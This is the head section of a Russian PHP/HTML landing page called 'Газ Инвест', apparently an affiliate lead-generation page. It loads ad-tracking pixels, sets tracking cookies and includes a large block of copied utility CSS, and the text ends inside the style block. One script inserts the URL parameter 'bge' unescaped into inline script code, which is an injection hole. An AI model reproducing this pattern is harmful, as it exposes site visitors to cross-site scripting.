<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />

    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="referrer" content="no-referrer" />
    <title>Газ Инвест</title>

    <link rel="stylesheet" href="css/normalize.css" />
    <link rel="stylesheet" href="css/styleB.css" />
    <link rel="stylesheet" href="css/intlTelInput.css" />
    <link rel="stylesheet" href="css/demo.css" />

    <script src="form/js/libs/intlTelInput.js"></script>

    <script>
      let scriptLoadings = false;
      // Функция для получения значения параметра из URL
      function getUrlParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
      }

      // Проверяем наличие параметров
      const bgeValue = getUrlParam("bge");
      const crmSource = getUrlParam("crm_source");

      if (bgeValue) {
        // Если есть только bgeValue – подключаем скрипты для bge
        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
        document.head.appendChild(inlineScript);

        // Подключаем второй скрипт для bge
        let asyncScript = document.createElement("script");
        asyncScript.src =
          "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
        document.head.appendChild(asyncScript);

        // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
        asyncScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
          console.log("Все скрипты для BGE загружены!");
        };
      } else if (!crmSource) {
        // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
        let trackScript = document.createElement("script");
        trackScript.type = "application/javascript";
        trackScript.src = "track.js?v=21238";
        document.head.appendChild(trackScript);

        trackScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки track.js
          console.log("track.js загружен!");
          window.removeEventListener("beforeunload", trackClose);
        };

        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
        document.head.appendChild(inlineScript);

        inlineScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
          console.log("Inline script для альтернативы загружен!");
        };

        let parseScript = document.createElement("script");
        parseScript.type = "application/javascript";
        parseScript.src = "parse_url.js?v=19";
        document.head.appendChild(parseScript);

        scriptLoadings = true;

        parseScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
          console.log("parse_url.js загружен!");
        };
      }
    </script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>

    <style>
      *,
      ::before,
      ::after {
        --tw-border-spacing-x: 0;
        --tw-border-spacing-y: 0;
        --tw-translate-x: 0;
        --tw-translate-y: 0;
        --tw-rotate: 0;
        --tw-skew-x: 0;
        --tw-skew-y: 0;
        --tw-scale-x: 1;
        --tw-scale-y: 1;
        --tw-pan-x: ;
        --tw-pan-y: ;
        --tw-pinch-zoom: ;
        --tw-scroll-snap-strictness: proximity;
        --tw-ordinal: ;
        --tw-slashed-zero: ;
        --tw-numeric-figure: ;
        --tw-numeric-spacing: ;
        --tw-numeric-fraction: ;
        --tw-ring-inset: ;
        --tw-ring-offset-width: 0px;
        --tw-ring-offset-color: #fff;
        --tw-ring-color: rgb(59 130 246 / 0.5);
        --tw-ring-offset-shadow: 0 0 #0000;
        --tw-ring-shadow: 0 0 #0000;
        --tw-shadow: 0 0 #0000;
        --tw-shadow-colored: 0 0 #0000;
        --tw-blur: ;
        --tw-brightness: ;
        --tw-contrast: ;
        --tw-grayscale: ;
        --tw-hue-rotate: ;
        --tw-invert: ;
        --tw-saturate: ;
        --tw-sepia: ;
        --tw-drop-shadow: ;
        --tw-backdrop-blur: ;
        --tw-backdrop-brightness: ;
        --tw-backdrop-contrast: ;
        --tw-backdrop-grayscale: ;
        --tw-backdrop-hue-rotate: ;
        --tw-backdrop-invert: ;
        --tw-backdrop-opacity: ;
        --tw-backdrop-saturate: ;
        --tw-backdrop-sepia: ;
      }

      ::backdrop {
        --tw-border-spacing-x: 0;
        --tw-border-spacing-y: 0;
        --tw-translate-x: 0;
        --tw-translate-y: 0;
        --tw-rotate: 0;
        --tw-skew-x: 0;
        --tw-skew-y: 0;
        --tw-scale-x: 1;
        --tw-scale-y: 1;
        --tw-pan-x: ;
        --tw-pan-y: ;
        --tw-pinch-zoom: ;
        --tw-scroll-snap-strictness: proximity;
        --tw-ordinal: ;
        --tw-slashed-zero: ;
        --tw-numeric-figure: ;
        --tw-numeric-spacing: ;
        --tw-numeric-fraction: ;
        --tw-ring-inset: ;
        --tw-ring-offset-width: 0px;
        --tw-ring-offset-color: #fff;
        --tw-ring-color: rgb(59 130 246 / 0.5);
        --tw-ring-offset-shadow: 0 0 #0000;
        --tw-ring-shadow: 0 0 #0000;
        --tw-shadow: 0 0 #0000;
        --tw-shadow-colored: 0 0 #0000;
        --tw-blur: ;
        --tw-brightness: ;
        --tw-contrast: ;
        --tw-grayscale: ;
        --tw-hue-rotate: ;
        --tw-invert: ;
        --tw-saturate: ;
        --tw-sepia: ;
        --tw-drop-shadow: ;
        --tw-backdrop-blur: ;
        --tw-backdrop-brightness: ;
        --tw-backdrop-contrast: ;
        --tw-backdrop-grayscale: ;
        --tw-backdrop-hue-rotate: ;
        --tw-backdrop-invert: ;
        --tw-backdrop-opacity: ;
        --tw-backdrop-saturate: ;
        --tw-backdrop-sepia: ;
      }

      .gpt-center-with-flex {
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .gpt-sr-only {
        position: absolute !important;
        width: 1px !important;
        height: 1px !important;
        padding: 0 !important;
        margin: -1px !important;
        overflow: hidden !important;
        clip: rect(0, 0, 0, 0) !important;
        white-space: nowrap !important;
        border-width: 0 !important;
      }

      .gpt-fixed {
        position: fixed !important;
      }

      .gpt-absolute {
        position: absolute !important;
      }

      .gpt-relative {
        position: relative !important;
      }

      .gpt-top-0 {
        top: 0px !important;
      }

      .gpt-left-0 {
        left: 0px !important;
      }

      .gpt-bottom-6 {
        bottom: 24px !important;
      }

      .gpt-right-6 {
        right: 24px !important;
      }

      .-gpt-top-2 {
        top: -8px !important;
      }

      .-gpt-right-2 {
        right: -8px !important;
      }

      .-gpt-bottom-1 {
        bottom: -4px !important;
      }

      .gpt-right-1 {
        right: 4px !important;
      }

      .gpt-z-\[99999999\] {
        z-index: 99999999 !important;
      }

      .gpt-z-50 {
        z-index: 50 !important;
      }

      .gpt-z-10 {
        z-index: 10 !important;
      }

      .gpt-z-20 {
        z-index: 20 !important;
      }

      .gpt-m-3 {
        margin: 12px !important;
      }

      .gpt-my-auto {
        margin-top: auto !important;
        margin-bottom: auto !important;
      }

      .gpt-my-2 {
        margin-top: 8px !important;
        margin-bottom: 8px !important;
      }

      .gpt-my-3 {
        margin-top: 12px !important;
        margin-bottom: 12px !important;
      }

      .gpt-mt-2 {
        margin-top: 8px !important;
      }

      .gpt-mb-4 {
        margin-bottom: 16px !important;
      }

      .gpt-mb-3 {
        margin-bottom: 12px !important;
      }

      .gpt-mt-6 {
        margin-top: 24px !important;
      }

      .gpt-mr-1 {
        margin-right: 4px !important;
      }

      .gpt-box-border {
        box-sizing: border-box !important;
      }

      .gpt-flex {
        display: flex !important;
      }

      .gpt-inline-flex {
        display: inline-flex !important;
      }

      .gpt-h-screen {
        height: 100vh !important;
      }

      .gpt-h-4 {
        height: 16px !important;
      }

      .gpt-h-full {
        height: 100% !important;
      }

      .gpt-h-5 {
        height: 20px !important;
      }

      .gpt-h-7 {
        height: 28px !important;
      }

      .gpt-h-6 {
        height: 24px !important;
      }

      .gpt-h-12 {
        height: 48px !important;
      }

      .gpt-h-8 {
        height: 32px !important;
      }

      .gpt-max-h-28 {
        max-height: 112px !important;
      }

      .gpt-max-h-12 {
        max-height: 48px !important;
      }

      .gpt-max-h-80 {
        max-height: 320px !important;
      }

      .gpt-min-h-\[20rem\] {
        min-height: 20rem !important;
      }

      .gpt-min-h-\[5rem\] {
        min-height: 5rem !important;
      }

      .gpt-w-14 {
        width: 56px !important;
      }

      .gpt-w-full {
        width: 100% !important;
      }

      .gpt-w-\[600px_\!important\] {
        width: 600px !important;
      }

      .gpt-w-4 {
        width: 16px !important;
      }

      .gpt-w-5 {
        width: 20px !important;
      }

      .gpt-w-3 {
        width: 12px !important;
      }

      .gpt-w-7 {
        width: 28px !important;
      }

      .gpt-w-6 {
        width: 24px !important;
      }

      .gpt-w-11 {
        width: 44px !important;
      }

      .gpt-w-12 {
        width: 48px !important;
      }

      .gpt-w-8 {
        width: 32px !important;
      }

      .gpt-min-w-\[320px\] {
        min-width: 320px !important;
      }

      .gpt-max-w-\[600px\] {
        max-width: 600px !important;
      }

      .gpt-flex-1 {
        flex: 1 1 0% !important;
      }

      @keyframes gpt-fade-in-merlinGUI {
        from {
          opacity: 0;
          transform: translateY(100px) scale(0.8);
        }

        to {
          opacity: 1;
          transform: none scale(1);
        }
      }

      .gpt-animate-fade-in-merlinGUI {
        animation: gpt-fade-in-merlinGUI 200ms 0ms ease forwards !important;
      }

      @keyframes gpt-fade-out-merlinGUI {
        from {
          opacity: 1;
          transform: none scale(1);
        }

        to {
          opacity: 0;
          transform: translateY(100px) scale(0.8);
        }
      }

      .gpt-animate-fade-out-merlinGUI {
        animation: gpt-fade-out-merlinGUI 200ms 0ms ease forwards !important;
      }

      @keyframes gpt-fade-in-2 {
        from {
          opacity: 0;
        }

        to {
          opacity: 1;
        }
      }

      .gpt-animate-fade-in-2 {
        animation: gpt-fade-in-2 300ms 0ms ease-in forwards !important;
      }

      @keyframes gpt-fade-in {
        from {
          opacity: 0;
          transform: translateY(-10px) scale(0.8);
        }

        to {
          opacity: 1;
          transform: none scale(1);
        }
      }

      .gpt-animate-fade-in {
        animation: gpt-fade-in 300ms 0ms ease forwards !important;
      }

      @keyframes gpt-fade-out {
        from {
          opacity: 1;
          transform: none scale(1);
        }

        to {
          opacity: 0;
          transform: translateY(-10px) scale(0.8);
        }
      }

      .gpt-animate-fade-out {
        animation: gpt-fade-out 300ms 0ms ease forwards !important;
      }

      .gpt-cursor-pointer {
        cursor: pointer !important;
      }

      .gpt-cursor-not-allowed {
        cursor: not-allowed !important;
      }

      .gpt-cursor-grab {
        cursor: grab !important;
      }

      .gpt-select-none {
        -webkit-user-select: none !important;
        -moz-user-select: none !important;
        user-select: none !important;
      }

      .gpt-resize-none {
        resize: none !important;
      }

      .gpt-flex-row {
        flex-direction: row !important;
      }

      .gpt-flex-row-reverse {
        flex-direction: row-reverse !important;
      }

      .gpt-flex-col {
        flex-direction: column !important;
      }

      .gpt-items-start {
        align-items: flex-start !important;
      }

      .gpt-items-center {
        align-items: center !important;
      }

      .gpt-items-stretch {
        align-items: stretch !important;
      }

      .gpt-justify-start {
        justify-content: flex-start !important;
      }

      .gpt-justify-end {
        justify-content: flex-end !important;
      }

      .gpt-justify-center {
        justify-content: center !important;
      }

      .gpt-justify-between {
        justify-content: space-between !important;
      }

      .gpt-gap-2 {
        gap: 8px !important;
      }

      .gpt-gap-4 {
        gap: 16px !important;
      }

      .gpt-gap-6 {
        gap: 24px !important;
      }

      .gpt-gap-3 {
        gap: 12px !important;
      }

      .gpt-gap-1 {
        gap: 4px !important;
      }

      .gpt-overflow-hidden {
        overflow: hidden !important;
      }

      .gpt-overflow-y-auto {
        overflow-y: auto !important;
      }

      .gpt-overflow-y-visible {
        overflow-y: visible !important;
      }

      .gpt-whitespace-nowrap {
        white-space: nowrap !important;
      }

      .gpt-rounded-full {
        border-radius: 9999px !important;
      }

      .gpt-rounded-lg {
        border-radius: 8px !important;
      }

      .gpt-rounded {
        border-radius: 4px !important;
      }

      .gpt-rounded-2xl {
        border-radius: 16px !important;
      }

      .gpt-rounded-xl {
        border-radius: 12px !important;
      }

      .gpt-rounded-3xl {
        border-radius: 24px !important;
      }

      .gpt-rounded-md {
        border-radius: 6px !important;
      }

      .gpt-rounded-t-xl {
        border-top-left-radius: 12px !important;
        border-top-right-radius: 12px !important;
      }

      .gpt-border {
        border-width: 1px !important;
      }

      .gpt-border-\[0px\] {
        border-width: 0px !important;
      }

      .gpt-border-b {
        border-bottom-width: 1px !important;
      }

      .gpt-border-t {
        border-top-width: 1px !important;
      }

      .gpt-border-t-0 {
        border-top-width: 0px !important;
      }

      .gpt-border-solid {
        border-style: solid !important;
      }

      .gpt-border-none {
        border-style: none !important;
      }

      .gpt-border-slate-300 {
        --tw-border-opacity: 1 !important;
        border-color: rgb(203 213 225 / var(--tw-border-opacity)) !important;
      }

      .gpt-border-slate-700 {
        --tw-border-opacity: 1 !important;
        border-color: rgb(51 65 85 / var(--tw-border-opacity)) !important;
      }

      .gpt-border-violet-700 {
        --tw-border-opacity: 1 !important;
        border-color: rgb(109 40 217 / var(--tw-border-opacity)) !important;
      }

      .gpt-border-b-slate-300 {
        --tw-border-opacity: 1 !important;
        border-bottom-color: rgb(
          203 213 225 / var(--tw-border-opacity)
        ) !important;
      }

      .gpt-border-t-slate-300 {
        --tw-border-opacity: 1 !important;
        border-top-color: rgb(
          203 213 225 / var(--tw-border-opacity)
        ) !important;
      }

      .gpt-bg-gray-800 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(31 41 55 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-gray-200 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(229 231 235 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-transparent {
        background-color: transparent !important;
      }

      .gpt-bg-slate-100 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(241 245 249 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-slate-200 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(226 232 240 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-slate-300 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(203 213 225 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-white {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(255 255 255 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-red-700 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(185 28 28 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-slate-900 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(15 23 42 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-violet-600 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(124 58 237 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-slate-800 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(30 41 59 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-slate-400 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(148 163 184 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-violet-800 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(91 33 182 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-slate-600 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(71 85 105 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-green-100 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(220 252 231 / var(--tw-bg-opacity)) !important;
      }

      .gpt-bg-opacity-10 {
        --tw-bg-opacity: 0.1 !important;
      }

      .gpt-bg-gradient-to-br {
        background-image: linear-gradient(
          to bottom right,
          var(--tw-gradient-stops)
        ) !important;
      }

      .gpt-bg-btn-gradient {
        background-image: linear-gradient(
          45deg,
          #facc15,
          #db2777,
          #7e22ce,
          #5b21b6
        ) !important;
      }

      .gpt-bg-gradient-to-b {
        background-image: linear-gradient(
          to bottom,
          var(--tw-gradient-stops)
        ) !important;
      }

      .gpt-from-purple-700 {
        --tw-gradient-from: #7e22ce !important;
        --tw-gradient-to: rgb(126 34 206 / 0) !important;
        --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to) !important;
      }

      .gpt-from-purple-900 {
        --tw-gradient-from: #581c87 !important;
        --tw-gradient-to: rgb(88 28 135 / 0) !important;
        --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to) !important;
      }

      .gpt-from-blue-700 {
        --tw-gradient-from: #1d4ed8 !important;
        --tw-gradient-to: rgb(29 78 216 / 0) !important;
        --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to) !important;
      }

      .gpt-from-amber-500 {
        --tw-gradient-from: #f59e0b !important;
        --tw-gradient-to: rgb(245 158 11 / 0) !important;
        --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to) !important;
      }

      .gpt-via-pink-500 {
        --tw-gradient-to: rgb(236 72 153 / 0) !important;
        --tw-gradient-stops: var(--tw-gradient-from), #ec4899,
          var(--tw-gradient-to) !important;
      }

      .gpt-to-fuchsia-600 {
        --tw-gradient-to: #c026d3 !important;
      }

      .gpt-to-purple-900 {
        --tw-gradient-to: #581c87 !important;
      }

      .gpt-to-blue-500 {
        --tw-gradient-to: #3b82f6 !important;
      }

      .gpt-to-violet-800 {
        --tw-gradient-to: #5b21b6 !important;
      }

      .gpt-to-amber-800 {
        --tw-gradient-to: #92400e !important;
      }

      .gpt-bg-right-bottom {
        background-position: right bottom !important;
      }

      .gpt-p-\[2px\] {
        padding: 2px !important;
      }

      .gpt-p-2 {
        padding: 8px !important;
      }

      .gpt-p-3 {
        padding: 12px !important;
      }

      .gpt-p-0 {
        padding: 0px !important;
      }

      .gpt-p-1 {
        padding: 4px !important;
      }

      .gpt-p-\[1px\] {
        padding: 1px !important;
      }

      .gpt-py-1 {
        padding-top: 4px !important;
        padding-bottom: 4px !important;
      }

      .gpt-px-4 {
        padding-left: 16px !important;
        padding-right: 16px !important;
      }

      .gpt-py-3 {
        padding-top: 12px !important;
        padding-bottom: 12px !important;
      }

      .gpt-px-3 {
        padding-left: 12px !important;
        padding-right: 12px !important;
      }

      .gpt-px-2 {
        padding-left: 8px !important;
        padding-right: 8px !important;
      }

      .gpt-py-2 {
        padding-top: 8px !important;
        padding-bottom: 8px !important;
      }

      .gpt-py-4 {
        padding-top: 16px !important;
        padding-bottom: 16px !important;
      }

      .gpt-px-1 {
        padding-left: 4px !important;
        padding-right: 4px !important;
      }

      .gpt-pt-\[7\%\] {
        padding-top: 7% !important;
      }

      .gpt-pt-\[3\%\] {
        padding-top: 3% !important;
      }

      .gpt-text-left {
        text-align: left !important;
      }

      .gpt-text-center {
        text-align: center !important;
      }

      .gpt-font-sans {
        font-family: sans-serif !important;
      }

      .gpt-text-xs {
        font-size: 12px !important;
        line-height: 16px !important;
      }

      .gpt-text-sm {
        font-size: 14px !important;
        line-height: 20px !important;
      }

      .gpt-text-base {
        font-size: 16px !important;
        line-height: 24px !important;
      }

      .gpt-text-lg {
        font-size: 18px !important;
        line-height: 28px !important;
      }

      .gpt-text-xl {
        font-size: 20px !important;
        line-height: 28px !important;
      }

      .gpt-font-medium {
        font-weight: 500 !important;
      }

      .gpt-font-normal {
        font-weight: 400 !important;
      }

      .gpt-font-light {
        font-weight: 300 !important;
      }

      .gpt-text-slate-50 {
        --tw-text-opacity: 1 !important;
        color: rgb(248 250 252 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-black {
        --tw-text-opacity: 1 !important;
        color: rgb(0 0 0 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-gray-900 {
        --tw-text-opacity: 1 !important;
        color: rgb(17 24 39 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-green-500 {
        --tw-text-opacity: 1 !important;
        color: rgb(34 197 94 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-slate-900 {
        --tw-text-opacity: 1 !important;
        color: rgb(15 23 42 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-slate-500 {
        --tw-text-opacity: 1 !important;
        color: rgb(100 116 139 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-green-700 {
        --tw-text-opacity: 1 !important;
        color: rgb(21 128 61 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-gray-400 {
        --tw-text-opacity: 1 !important;
        color: rgb(156 163 175 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-neutral-800 {
        --tw-text-opacity: 1 !important;
        color: rgb(38 38 38 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-slate-100 {
        --tw-text-opacity: 1 !important;
        color: rgb(241 245 249 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-slate-700 {
        --tw-text-opacity: 1 !important;
        color: rgb(51 65 85 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-slate-300 {
        --tw-text-opacity: 1 !important;
        color: rgb(203 213 225 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-green-800 {
        --tw-text-opacity: 1 !important;
        color: rgb(22 101 52 / var(--tw-text-opacity)) !important;
      }

      .gpt-text-amber-700 {
        --tw-text-opacity: 1 !important;
        color: rgb(180 83 9 / var(--tw-text-opacity)) !important;
      }

      .gpt-underline {
        text-decoration-line: underline !important;
      }

      .gpt-underline-offset-2 {
        text-underline-offset: 2px !important;
      }

      .gpt-opacity-0 {
        opacity: 0 !important;
      }

      .gpt-shadow-none {
        --tw-shadow: 0 0 #0000 !important;
        --tw-shadow-colored: 0 0 #0000 !important;
        box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow) !important;
      }

      .gpt-outline-none {
        outline: 2px solid transparent !important;
        outline-offset: 2px !important;
      }

      .gpt-drop-shadow-3xl {
        --tw-drop-shadow: drop-shadow(
          0 35px 35px rgba(0, 0, 0, 0.4)
        ) !important;
        filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast)
          var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert)
          var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow) !important;
      }

      .gpt-backdrop-blur-sm {
        --tw-backdrop-blur: blur(4px) !important;
        -webkit-backdrop-filter: var(--tw-backdrop-blur)
          var(--tw-backdrop-brightness) var(--tw-backdrop-contrast)
          var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate)
          var(--tw-backdrop-invert) var(--tw-backdrop-opacity)
          var(--tw-backdrop-saturate) var(--tw-backdrop-sepia) !important;
        backdrop-filter: var(--tw-backdrop-blur) var(--tw-backdrop-brightness)
          var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale)
          var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert)
          var(--tw-backdrop-opacity) var(--tw-backdrop-saturate)
          var(--tw-backdrop-sepia) !important;
      }

      .gpt-backdrop-blur {
        --tw-backdrop-blur: blur(8px) !important;
        -webkit-backdrop-filter: var(--tw-backdrop-blur)
          var(--tw-backdrop-brightness) var(--tw-backdrop-contrast)
          var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate)
          var(--tw-backdrop-invert) var(--tw-backdrop-opacity)
          var(--tw-backdrop-saturate) var(--tw-backdrop-sepia) !important;
        backdrop-filter: var(--tw-backdrop-blur) var(--tw-backdrop-brightness)
          var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale)
          var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert)
          var(--tw-backdrop-opacity) var(--tw-backdrop-saturate)
          var(--tw-backdrop-sepia) !important;
      }

      .gpt-transition-colors {
        transition-property: color, background-color, border-color,
          text-decoration-color, fill, stroke !important;
        transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1) !important;
        transition-duration: 150ms !important;
      }

      .gpt-transition-all {
        transition-property: all !important;
        transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1) !important;
        transition-duration: 150ms !important;
      }

      .gpt-transition-opacity {
        transition-property: opacity !important;
        transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1) !important;
        transition-duration: 150ms !important;
      }

      .gpt-duration-200 {
        transition-duration: 200ms !important;
      }

      .gpt-duration-500 {
        transition-duration: 500ms !important;
      }

      .gpt-duration-700 {
        transition-duration: 700ms !important;
      }

      .gpt-duration-300 {
        transition-duration: 300ms !important;
      }

      .gpt-ease-in {
        transition-timing-function: cubic-bezier(0.4, 0, 1, 1) !important;
      }

      .\[border-bottom-style\:solid\] {
        border-bottom-style: solid;
      }

      .\[border-top-style\:solid\] {
        border-top-style: solid;
      }

      .\[background-size\:400\%_400\%\] {
        background-size: 400% 400%;
      }

      .\[border-style\:solid\] {
        border-style: solid;
      }

      /* @layer base {













  .merlinExt *,
  .merlinExt ::before,
  .merlinExt ::after {
    all: unset;
  }

















} */
      .placeholder\:gpt-text-base::-moz-placeholder {
        font-size: 16px !important;
        line-height: 24px !important;
      }

      .placeholder\:gpt-text-base::placeholder {
        font-size: 16px !important;
        line-height: 24px !important;
      }

      .placeholder\:gpt-text-slate-400::-moz-placeholder {
        --tw-text-opacity: 1 !important;
        color: rgb(148 163 184 / var(--tw-text-opacity)) !important;
      }

      .placeholder\:gpt-text-slate-400::placeholder {
        --tw-text-opacity: 1 !important;
        color: rgb(148 163 184 / var(--tw-text-opacity)) !important;
      }

      .after\:gpt-absolute::after {
        content: var(--tw-content) !important;
        position: absolute !important;
      }

      .after\:gpt-top-\[2px\]::after {
        content: var(--tw-content) !important;
        top: 2px !important;
      }

      .after\:gpt-left-\[2px\]::after {
        content: var(--tw-content) !important;
        left: 2px !important;
      }

      .after\:gpt-h-5::after {
        content: var(--tw-content) !important;
        height: 20px !important;
      }

      .after\:gpt-w-5::after {
        content: var(--tw-content) !important;
        width: 20px !important;
      }

      .after\:gpt-rounded-full::after {
        content: var(--tw-content) !important;
        border-radius: 9999px !important;
      }

      .after\:gpt-border::after {
        content: var(--tw-content) !important;
        border-width: 1px !important;
      }

      .after\:gpt-border-gray-300::after {
        content: var(--tw-content) !important;
        --tw-border-opacity: 1 !important;
        border-color: rgb(209 213 219 / var(--tw-border-opacity)) !important;
      }

      .after\:gpt-bg-white::after {
        content: var(--tw-content) !important;
        --tw-bg-opacity: 1 !important;
        background-color: rgb(255 255 255 / var(--tw-bg-opacity)) !important;
      }

      .after\:gpt-transition-colors::after {
        content: var(--tw-content) !important;
        transition-property: color, background-color, border-color,
          text-decoration-color, fill, stroke !important;
        transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1) !important;
        transition-duration: 150ms !important;
      }

      .after\:gpt-content-\[\'\'\]::after {
        --tw-content: "" !important;
        content: var(--tw-content) !important;
      }

      .hover\:gpt-bg-slate-700:hover {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(51 65 85 / var(--tw-bg-opacity)) !important;
      }

      .hover\:gpt-bg-slate-300:hover {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(203 213 225 / var(--tw-bg-opacity)) !important;
      }

      .hover\:gpt-bg-left-top:hover {
        background-position: left top !important;
      }

      .gpt-group:hover .group-hover\:gpt-opacity-100 {
        opacity: 1 !important;
      }

      .gpt-peer:checked ~ .peer-checked\:gpt-bg-blue-700 {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(29 78 216 / var(--tw-bg-opacity)) !important;
      }

      .gpt-peer:checked ~ .peer-checked\:after\:gpt-translate-x-full::after {
        content: var(--tw-content) !important;
        --tw-translate-x: 100% !important;
        transform: translate(var(--tw-translate-x), var(--tw-translate-y))
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y)) !important;
      }

      .gpt-peer:checked ~ .peer-checked\:after\:gpt-border-white::after {
        content: var(--tw-content) !important;
        --tw-border-opacity: 1 !important;
        border-color: rgb(255 255 255 / var(--tw-border-opacity)) !important;
      }

